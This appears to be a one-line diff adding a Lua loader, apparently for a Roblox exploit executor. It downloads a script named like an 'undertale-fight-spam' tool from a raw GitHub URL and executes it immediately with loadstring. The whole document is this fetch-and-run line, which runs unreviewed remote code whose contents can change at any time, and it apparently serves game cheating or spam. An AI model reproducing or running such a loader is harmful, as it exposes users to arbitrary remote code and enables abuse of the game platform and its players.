@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Centeryeabyss/loaders/main/loaders/undertale-fight-spam7-4swy3ffqo7557m.lua"))()
